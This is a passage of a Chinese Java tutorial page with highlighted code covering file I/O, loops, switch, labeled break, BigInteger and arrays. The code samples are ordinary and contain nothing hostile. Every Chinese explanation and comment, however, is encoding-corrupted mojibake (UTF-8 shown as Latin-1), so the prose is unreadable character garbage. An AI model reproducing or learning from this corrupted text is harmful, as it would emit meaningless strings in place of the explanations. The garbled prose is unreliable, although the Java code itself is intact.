punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello,world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hhhhhh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»æœ‰ï¼Œä¸ç„¶å†™ä¸è¿›å»</span></code></pre><p>å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºè¯¥æ–‡ä»¶ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Draft</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Scanner</span> in<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.java"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">PrintWriter</span> out<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.txt"</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å…³äºè·¯å¾„é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è°ƒç”¨æ‰¾åˆ°å¯åŠ¨ç›®å½•çš„ä½ç½®ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>IntelliJ IDEAçš„å¯åŠ¨ç›®å½•æ€»æ˜¯å’Œ.ideaåŒçº§è€Œä¸æ˜¯å½“ç„¶æ‰§è¡Œçš„srcé‡Œé¢çš„é‚£ä¸ªMain.javaã€‚</p><p>Javaä¸­ï¼Œä¸èƒ½åœ¨åµŒå¥—çš„ä¸¤ä¸ªå—ä¸­å£°æ˜åŒåçš„å˜é‡ã€‚</p><p>ifè¯­å¥ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token operator">></span> <span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>whileè¯­å¥ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>feng<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span>    feng<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>forï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>åœ¨å¾ªç¯ä¸­ï¼Œæ£€æµ‹ä¸¤ä¸ªæµ®ç‚¹æ•°æ˜¯å¦ç›¸ç­‰éœ€è¦æ ¼å¤–å°å¿ƒ</strong>ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>x <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span>x<span class="token operator">+=</span><span class="token number">0.1</span><span class="token punctuation">)</span></code></pre><p>æ°¸è¿œä¸ä¼šç»“æŸï¼Œç”±äºèˆå…¥çš„è¯¯å·®ï¼Œæ°¸è¿œè¾¾ä¸åˆ°ç²¾ç¡®çš„æœ€ç»ˆå€¼ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span><span class="token comment">//i no longer defined here</span><span class="token comment">//æ­¤å¤–ï¼Œå¦‚æœåœ¨forè¯­å¥å†…éƒ¨å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œè¿™ä¸ªå˜é‡å°±ä¸èƒ½åœ¨å¾ªç¯ä½“ä¹‹å¤–ä½¿ç”¨ã€‚</span></code></pre><p>switchï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>æœ‰å¯èƒ½è§¦å‘å¤šä¸ªcaseåˆ†æ”¯ã€‚å¦‚æœåœ¨caseåˆ†æ”¯è¯­å¥çš„æœ«å°¾æ²¡æœ‰breakè¯­å¥ï¼Œé‚£ä¹ˆå°±ä¼šæ¥ç€æ‰§è¡Œä¸‹ä¸€ä¸ªcaseåˆ†æ”¯è¯­å¥ã€‚è¿™ç§æƒ…å†µéå¸¸å±é™©ï¼Œå› æ­¤æœ€å¥½ä¸è¦ä½¿ç”¨switchè¯­å¥ã€‚</strong></p><p>å¸¦æ ‡ç­¾çš„breakè¯­å¥ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>feng<span class="token operator">:</span><span class="token keyword">while</span><span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">></span> count<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span> feng<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è™½ç„¶ä»£ç æ¯«æ— é€»è¾‘ï¼Œä½†æ˜¯è‡³å°‘äº†è§£äº†ä¸€ä¸‹å¸¦æ ‡ç­¾çš„breakã€‚</p><p>æ ‡ç­¾å¿…é¡»æ”¾åœ¨å¸Œæœ›è·³å‡ºçš„æœ€å¤–å±‚å¾ªç¯ä¹‹å¤–ï¼Œå¹¶ä¸”å¿…é¡»ç´§è·Ÿä¸€ä¸ªå†’å·ã€‚æ‰§è¡Œå¸¦æ ‡ç­¾çš„breakä¼šè·³è½¬åˆ°å¸¦æ ‡ç­¾çš„è¯­å¥å—æœ«å°¾ã€‚è¿™é‡Œå°±æ˜¯ç»“æŸè¿™ä¸ªwhileå¾ªç¯ï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„æ˜¯0ã€‚</p><p>å¤§æ•°ï¼š</p><p><code>java.math</code>åŒ…ä¸­ä¸¤ä¸ªå¾ˆæœ‰ç”¨çš„ç±»ï¼š<code>BigInteger</code>å’Œ<code>BigDecimal</code>ã€‚è¿™ä¸¤ä¸ªç±»å¯ä»¥å¤„ç†åŒ…å«ä»»æ„é•¿åº¦æ•°å­—åºåˆ—çš„æ•°å€¼ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">      <span class="token class-name">BigInteger</span> a <span class="token operator">=</span> <span class="token class-name">BigInteger</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¯¹äºæ›´å¤§çš„æ•°ï¼Œå°±æ˜¯ç”¨å¸¦å­—ç¬¦ä¸²çš„æ„é€ å™¨</span>      <span class="token class-name">BigInteger</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1000000000000000000000000000000000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ­¤å¤–Javaæ²¡æœ‰æä¾›è¿ç®—ç¬¦é‡è½½çš„åŠŸèƒ½ï¼Œå› æ­¤å¿…é¡»ç”¨add,multiply,divide,subtractç­‰å‡½æ•°ã€‚</p><p><strong>æ•°ç»„</strong></p><p>å£°æ˜æ•°ç»„ï¼šåœ¨å£°æ˜æ•°ç»„å˜é‡çš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å‡ºæ•°ç»„ç±»å‹ï¼ˆæ•°ç»„å…ƒç´ ç±»å‹ç´§è·Ÿ[]ï¼‰å’Œæ•°ç»„å˜é‡çš„åå­—ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span></code></pre><p>ä½¿ç”¨<strong>new</strong>æ“ä½œç¬¦åˆ›å»ºæ•°ç»„ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>ä¸€æ—¦åˆ›å»ºäº†æ•°ç»„ï¼Œå°±ä¸èƒ½å†æ”¹å˜å®ƒçš„é•¿åº¦ã€‚</p><p>è¿˜æœ‰ä¸€ç§åˆ›å»ºæ•°ç»„å¯¹è±¡å¹¶åŒæ—¶æä¾›åˆå§‹å€¼çš„ç®€å†™å½¢å¼ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span> <span class="token comment">//æœ€åä¸€ä¸ªå€¼åé¢å…è®¸æœ‰é€—å·</span></code></pre><p>è¿˜å¯ä»¥å£°æ˜åŒ¿åæ•°ç»„ã€‚è¿™ç§è¯­æ³•å¯ä»¥é‡æ–°åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„è€Œæ— é¡»åˆ›å»ºæ–°å˜é‡ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Javaä¸­å…è®¸æœ‰é•¿åº¦ä¸º0çš„æ•°ç»„ï¼Œåˆ›å»ºé•¿åº¦ä¸º0çš„æ•°ç»„ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>åˆ›å»ºä¸€ä¸ªæ•°å­—æ•°ç»„æ—¶ï¼Œæ‰€æœ‰å…ƒç´ éƒ½åˆå§‹åŒ–ä¸º0ã€‚booleanæ•°ç»„çš„å…ƒç´ ä¼šåˆå§‹åŒ–ä¸ºfalseã€‚å¯¹è±¡æ•°ç»„çš„å…ƒç´ åˆ™åˆå§‹åŒ–ä¸ºä¸€ä¸ªç‰¹æ®Šå€¼nullï¼Œè¡¨ç¤ºè¿™äº›å…ƒç´ è¿˜æœªå­˜æ”¾ä»»ä½•å¯¹è±¡ã€‚</p><p>ä½¿ç”¨<code>array.length</code>è·å¾—æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Javaä¸­çš„for eachå¾ªç¯ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>variable <span class="token operator">:</span> collection<span class="token punctuation">)</span> statement</code></pre><p>collectionè¿™ä¸€é›†åˆè¡¨è¾¾å¼å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…æ˜¯ä¸€ä¸ªå®ç°äº†Iterableæ¥å£çš„ç±»å¯¹è±¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>for eachå¾ªç¯è¯­å¥çš„å¾ªç¯å˜é‡å°†ä¼šéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè€Œä¸æ˜¯ä¸‹æ ‡å€¼ã€‚</p><p><code>Arrays</code>ç±»çš„<code>toString</code>æ–¹æ³•å¯ä»¥ç®€å•çš„æ‰“å°ä¸€ä¸ªæ•°ç»„ä¸­çš„æ‰€æœ‰å€¼ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ•°ç»„æ‹·è´ï¼š</p><p>å°†ä¸€ä¸ªæ•°ç»„å˜é‡æ‹·è´åˆ°å¦ä¸€ä¸ªæ•°ç»„å˜é‡ï¼Œè¿™æ—¶ä¸¤ä¸ªå˜é‡å°†å¼•ç”¨åŒä¸€æ•°ç»„ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>å¦‚æœå¸Œæœ›å°†ä¸€æ•°ç»„ä¸­çš„æ‰€æœ‰å€¼æ‹·è´åˆ°ä¸€ä¸ªæ–°çš„æ•°ç»„ä¸­å»ï¼Œå¸¸ç”¨Arraysç±»çš„copyOfæ–¹æ³•ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>copyOfçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–°æ•°ç»„çš„å¤§å°ï¼Œæ­£å¸¸å¯ä»¥æ¯”åŸæ•°ç»„çš„é•¿åº¦è¦å¤§ï¼Œä»¥å¢é•¿æ•°ç»„ã€‚å¦‚æœçŸ­çš„è¯ï¼Œå°±åªä¼šæ‹·è´å‰é¢çš„å€¼ã€‚</p><p><code>Arrays.sort()</code>ï¼Œä½¿ç”¨ä¼˜åŒ–çš„å¿«é€Ÿæ’åºç®—æ³•ã€‚</p><p><strong>å¤šç»´æ•°ç»„</strong></p><p>å£°æ˜ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> feng<span class="token punctuation">;</span></code></pre><p>åˆå§‹åŒ–ï¼š</p><pre class="language-java" data-language="java"><code class="language-java">feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>for eachä¸èƒ½è‡ªåŠ¨å¤„ç†äºŒç»´æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯å¾ªç¯è¡Œçš„ï¼Œå› æ­¤è¦ä½¿ç”¨2å±‚for 